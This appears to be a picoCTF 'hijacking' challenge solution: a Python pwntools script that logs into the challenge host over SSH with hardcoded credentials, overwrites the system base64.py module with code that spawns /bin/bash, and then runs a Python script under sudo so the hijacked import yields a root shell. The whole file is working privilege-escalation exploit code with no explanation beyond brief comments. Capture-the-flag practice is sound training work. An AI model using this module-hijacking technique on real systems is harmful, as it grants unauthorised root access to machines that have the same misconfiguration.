# picoCTF-hijacking-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 62309
    user = "picoctf"
    password = "16IiP0AsuU"

    # variables
    python_3_path = "/usr/bin/python3"
    python_file_bath = "/home/picoctf/.server.py"
    base64_py_path = "/usr/lib/python3.8/base64.py"
    payload = "echo \"import os;os.system('/bin/bash')\" > " + base64_py_path

    # connect to instance
    s = ssh(user, host, port, password)
    p = s.process('/bin/bash')

    # overwrite base64.py
    p.sendline(payload.encode())
    p.recv(timeout=1)

    # run python file
    p.sendline(f"sudo {python_3_path} {python_file_bath}")
    p.interactive()
    p.close()
    s.close()

if __name__ == "__main__":
    main()